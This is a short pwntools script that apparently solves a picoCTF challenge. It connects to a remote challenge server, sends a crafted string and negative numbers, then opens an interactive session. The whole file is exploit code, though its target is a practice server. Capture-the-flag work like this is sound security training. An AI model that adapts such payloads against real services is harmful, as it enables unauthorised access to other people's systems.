from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'saturn.picoctf.net', 56583
r = remote(HOST, PORT)

payload = '~' * 10 + 'M'
r.sendlineafter('>> ', payload)
r.sendlineafter('10.\n', '-16')
r.sendline('-314')

r.interactive()